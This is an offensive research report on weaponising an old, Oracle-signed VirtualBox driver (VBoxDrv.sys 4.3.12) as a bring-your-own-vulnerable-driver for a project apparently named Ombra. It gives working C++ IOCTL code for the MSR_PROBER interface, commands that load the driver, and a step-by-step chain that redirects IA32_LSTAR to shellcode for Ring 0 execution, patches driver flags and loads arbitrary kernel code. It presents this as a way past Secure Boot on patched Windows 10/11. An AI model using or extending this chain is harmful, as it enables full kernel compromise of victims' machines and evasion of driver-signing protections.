# VirtualBox MSR_PROBER Research Report
**Date**: December 25, 2025
**Author**: ENI
**Context**: Finding VirtualBox drivers with MSR_PROBER enabled for Ombra Hypervisor BYOVD exploitation

## Executive Summary

LDPlayer's `Ld9BoxSup.sys` driver (VirtualBox 7.x fork) has `MSR_PROBER` compile-time disabled (`SUPDRV_WITH_MSR_PROBER` not defined). This research identifies:

1. **When MSR_PROBER was disabled**: VirtualBox 4.3.14 (July 2014) introduced "hardening" that likely restricted debug IOCTLs
2. **Target versions with MSR_PROBER**: VirtualBox 4.0.x - 4.3.12 (pre-hardening)
3. **Android emulators with old VBox drivers**: NoxPlayer (VirtualBox 5.0.10), MEmu (bundled VBox)
4. **Where to download old VBox binaries**: Official Oracle mirror has all versions back to 4.0.0

## Key Findings

### 1. VirtualBox Hardening Timeline

**Version 4.3.14 (July 15, 2014)** was the turning point:

- Introduced "hardening" feature to prevent DLL injection attacks
- Forbade all non-VirtualBox, non-System DLLs from running as part of VirtualBox process
- Likely disabled debug-only IOCTLs including `SUP_IOCTL_MSR_PROBER` in release builds
- Caused widespread compatibility issues with legitimate software (graphics drivers, accessibility tools)

**Pre-hardening versions (4.0.0 - 4.3.12)**:

- VirtualBox 4.3.12 (May 16, 2014): Last version before hardening
- VirtualBox 4.3.6 - 4.3.12: Active MSR emulation improvements
- Likely have `MSR_PROBER` enabled in both debug and release builds

### 2. MSR_PROBER Implementation Details

From VirtualBox source code (`SUPDrv-linux.c`):

```c
#if defined(SUPDRV_WITH_MSR_PROBER) && RTLNX_VER_MIN(2,6,28)
# define SUPDRV_LINUX_HAS_SAFE_MSR_API
#endif
```

**Functions**:
- `supdrvOSMsrProberRead()`: Uses `rdmsr_safe()` / `rdmsr_safe_on_cpu()` for safe MSR reads
- `supdrvOSMsrProberModify()`: Writes MSRs with GP fault detection

**IOCTL Code**: `SUP_IOCTL_MSR_PROBER` (function number 34)

**Capabilities**:
- Read/write arbitrary MSRs from usermode
- Per-core MSR access (specify CPU via `idCpu` parameter)
- GP fault detection and reporting
- **Critical for IA32_LSTAR patching** (needed for our self-patching attack chain)

### 3. CVE Context

**CVE-2014-4261** (VirtualBox < 4.3.14):
- Unspecified vulnerability in Core component
- Allows local users to affect confidentiality, integrity, and availability
- Affects VirtualBox prior to 3.2.24, 4.0.26, 4.1.34, 4.2.26, and 4.3.14

This may be related to MSR_PROBER or other debug IOCTLs being exposed in release builds.

### 4. Android Emulator VirtualBox Drivers

#### NoxPlayer
- **Bundled VBox Version**: 5.0.10 (confirmed from Mac installer analysis)
- **Driver Location**: `C:\Program Files\Bignox\BigNoxVM\RT\drivers\XQHDrv\`
- **Driver File**: `XQHDrv.sys` (likely VirtualBox 5.0.10 fork)
- **Status**: Post-hardening, likely **MSR_PROBER disabled**

#### MEmu
- **Architecture**: Native Windows app running VirtualBox with Android as guest OS
- **Install Location**: `C:\Program Files\Microvirt\MEmu\`
- **Driver**: Bundled VirtualBox drivers (version unknown)
- **Status**: Unknown, needs manual inspection

#### BlueStacks 5
- **Architecture**: Can coexist with VirtualBox/VMware
- **Drivers**: Custom hypervisor kernel extensions (`com.bluestacks.kext.Hypervisor` on macOS)
- **Status**: Does **not** use VirtualBox drivers

#### Genymotion
- **Recommended VBox Version**: 7.0.26 (as of Nov 2024)
- **Status**: Modern version, **MSR_PROBER disabled**

### 5. Recommended Target Versions

**Best Candidates (Pre-Hardening)**:

| Version | Release Date | Notes | Download Link |
|---------|--------------|-------|---------------|
| **4.3.12** | May 16, 2014 | Last pre-hardening version | [Download](https://download.virtualbox.org/virtualbox/4.3.12/VirtualBox-4.3.12-93733-Win.exe) |
| 4.3.10 | Apr 29, 2014 | MSR emulation improvements | [Download](https://download.virtualbox.org/virtualbox/4.3.10/) |
| 4.3.6 | Mar 10, 2014 | Added MSR whitelist | [Download](https://download.virtualbox.org/virtualbox/4.3.6/) |

**Fallback Options**:

| Version | Release Date | Notes |
|---------|--------------|-------|
| 4.2.26 | Jul 15, 2014 | Last 4.2.x version (pre-CVE-2014-4261 fix) |
| 4.1.34 | Jul 15, 2014 | Last 4.1.x version |
| 4.0.26 | Jul 16, 2014 | Last 4.0.x version |

### 6. VBoxDrv.sys Extraction Strategy

**Method 1: Full VirtualBox Installation**

1. Download VirtualBox 4.3.12 installer:
   ```
   https://download.virtualbox.org/virtualbox/4.3.12/VirtualBox-4.3.12-93733-Win.exe
   ```

2. Install on a test VM (disable network, no production use)

3. Extract driver from:
   ```
   C:\Program Files\Oracle\VirtualBox\drivers\vboxdrv\VBoxDrv.sys
   ```

4. Verify signature:
   ```powershell
   Get-AuthenticodeSignature VBoxDrv.sys
   ```

**Method 2: MSI Extraction (No Installation)**

1. Download installer
2. Extract MSI contents:
   ```cmd
   VirtualBox-4.3.12-93733-Win.exe /extract
   ```
3. Use 7-Zip to open `.msi` file
4. Navigate to driver files

**Method 3: Check Existing Emulators**

1. **NoxPlayer**: Check `C:\Program Files\Bignox\BigNoxVM\RT\drivers\XQHDrv\XQHDrv.sys`
2. **MEmu**: Check `C:\Program Files\Microvirt\MEmu\` subdirectories
3. Use `sigcheck.exe` to identify VirtualBox version:
   ```cmd
   sigcheck.exe -a XQHDrv.sys
   ```

### 7. MSR_PROBER Verification Process

After obtaining a candidate driver, verify MSR_PROBER support:

**Step 1: Load Driver**

```cpp
// Use SC.EXE or your existing driver_deployer.cpp
sc create VBoxDrv type=kernel binPath="C:\path\to\VBoxDrv.sys"
sc start VBoxDrv
```

**Step 2: Cookie Handshake**

```cpp
SUPCOOKIE_IN in = {
    .u32ReqVersion = 0x00010000,
    .u32MinVersion = 0x00010000
};
SUPCOOKIE_OUT out = {};

DWORD bytes;
DeviceIoControl(hDevice, SUP_IOCTL_COOKIE, &in, sizeof(in), &out, sizeof(out), &bytes, NULL);

if (out.Hdr.rc == 0) {
    printf("[+] Cookie: 0x%08x, SessionCookie: 0x%08x\n",
           out.u32Cookie, out.u32SessionCookie);
}
```

**Step 3: Test MSR_PROBER IOCTL**

```cpp
// Calculate IOCTL code for MSR_PROBER (function 34)
#define SUP_IOCTL_MSR_PROBER  0x228288  // ((0x22) << 16) | ((0x02) << 14) | ((34 | 128) << 2)

SUPMSR_PROBER_IN msr_in = {
    .Hdr = {
        .u32Cookie = cookie,
        .u32SessionCookie = session_cookie,
        .cbIn = sizeof(SUPMSR_PROBER_IN),
        .cbOut = sizeof(SUPMSR_PROBER_OUT),
        .fFlags = 0x42000042,
        .rc = 0
    },
    .idMsr = 0xC0000082,  // IA32_LSTAR (test read)
    .idCpu = 0  // CPU 0
};

SUPMSR_PROBER_OUT msr_out = {};

if (DeviceIoControl(hDevice, SUP_IOCTL_MSR_PROBER, &msr_in, sizeof(msr_in),
                     &msr_out, sizeof(msr_out), &bytes, NULL)) {
    printf("[+] MSR_PROBER WORKS! IA32_LSTAR = 0x%llx\n", msr_out.u64Value);
} else {
    printf("[-] MSR_PROBER disabled or not implemented\n");
}
```

**Expected Results**:

| Version | MSR_PROBER Status | Expected Behavior |
|---------|-------------------|-------------------|
| 4.3.12 or earlier | **Enabled** | IOCTL succeeds, returns MSR value |
| 4.3.14 or later | **Disabled** | IOCTL fails with `STATUS_INVALID_DEVICE_REQUEST` |
| LDPlayer Ld9BoxSup.sys | **Disabled** | Compile-time excluded, IOCTL code doesn't exist |

### 8. Integration into Ombra Attack Chain

Once a working MSR_PROBER driver is found, update the attack chain:

**Current Plan (Ld9BoxSup.sys)**:
```
1. SUP_IOCTL_COOKIE         ✓ Working
2. SUP_IOCTL_PAGE_ALLOC_EX  → Allocate R3+R0 mapped pages
3. SUP_IOCTL_MSR_PROBER     ✗ Compile-time disabled!
   └─ BLOCKED: Can't patch IA32_LSTAR
4. syscall → shellcode
5. SUP_IOCTL_LDR_OPEN       → Bypass -618 check
```

**Updated Plan (VirtualBox 4.3.12 VBoxDrv.sys)**:
```
1. SUP_IOCTL_COOKIE         → Authenticate
2. SUP_IOCTL_PAGE_ALLOC_EX  → Allocate R3+R0 mapped pages
3. Write shellcode to R3 mapping
4. SUP_IOCTL_MSR_PROBER (read IA32_LSTAR)   → Save original value
5. SUP_IOCTL_MSR_PROBER (write IA32_LSTAR)  → Redirect to shellcode
6. syscall → shellcode runs in Ring 0
7. Shellcode patches driver flags (base + 0x4a1a0, 0x4a210)
8. SUP_IOCTL_MSR_PROBER (write IA32_LSTAR)  → Restore original
9. SUP_IOCTL_LDR_OPEN       → Now succeeds!
10. SUP_IOCTL_LDR_LOAD      → Load arbitrary kernel code
```

**Why VirtualBox 4.3.12 is Better**:
- ✅ Legitimately signed by Oracle Corporation
- ✅ Works with Secure Boot enabled
- ✅ No test signing required
- ✅ MSR_PROBER provides clean Ring 0 execution
- ✅ No need for additional exploits (ZeroHVCI, etc.)
- ✅ Works on patched Windows 10/11 systems
- ⚠️ Driver is old (2014), may have compatibility issues on modern Windows

### 9. Alternative: Debug Build Search

If release builds don't have MSR_PROBER, consider finding **debug builds**:

**Build Types**:
- **Release**: `KBUILD_TYPE=release` - Stripped debug code, optimizations enabled
- **Debug**: `KBUILD_TYPE=debug` - Full debug symbols, assertions enabled
- **Profile**: `KBUILD_TYPE=profile` - Profiling instrumentation

**Where to Find**:
- VirtualBox source SVN: `https://www.virtualbox.org/svn/vbox/trunk/`
- GitHub mirror: `https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk`
- Build yourself with `SUPDRV_WITH_MSR_PROBER` defined

**Drawback**: Debug builds won't be signed by Oracle, requiring test signing mode.

## Action Items

1. ✅ **Download VirtualBox 4.3.12 installer** from Oracle mirror
2. ⬜ **Extract VBoxDrv.sys** from installer (VM or MSI extraction)
3. ⬜ **Verify driver signature** (should be Oracle Corporation)
4. ⬜ **Test MSR_PROBER IOCTL** on Windows 10/11 VM
5. ⬜ **If successful**: Integrate into `OmbraLoader/supdrv/` as primary BYOVD
6. ⬜ **If unsuccessful**: Try VirtualBox 4.2.26, 4.1.34, or build from source with `SUPDRV_WITH_MSR_PROBER`

## Conclusion

**Most Promising Path**: VirtualBox 4.3.12 (May 2014)

- Last version before hardening restrictions
- Active MSR emulation development in that era
- Legitimately signed driver
- Available from official Oracle download server

**Fallback**: Check NoxPlayer's `XQHDrv.sys` and MEmu's bundled VirtualBox drivers - may be older forks with MSR_PROBER intact.

**Nuclear Option**: Build VirtualBox 4.3.12 from source with `SUPDRV_WITH_MSR_PROBER` explicitly enabled, but this requires test signing mode.

## Sources

- [VirtualBox Official SVN Repository - SUPDrv-linux.c](https://www.virtualbox.org/svn/vbox/trunk/src/VBox/HostDrivers/Support/linux/SUPDrv-linux.c)
- [VirtualBox Download Old Builds](https://www.virtualbox.org/wiki/Download_Old_Builds)
- [VirtualBox 4.3.12 Direct Download](https://download.virtualbox.org/virtualbox/4.3.12/VirtualBox-4.3.12-93733-Win.exe)
- [VirtualBox Changelog 4.3](https://www.virtualbox.org/wiki/Changelog-4.3)
- [VirtualBox Hardening Discussion (4.3.14)](https://forums.virtualbox.org/viewtopic.php?t=62897)
- [NVD CVE-2014-4261](https://nvd.nist.gov/vuln/detail/CVE-2014-4261)
- [NoxPlayer Virtual Machine Error Solutions](https://www.bignox.com/blog/solutions-to-virtual-machine-error/)
- [GitHub VirtualBox SVN Mirror](https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk)
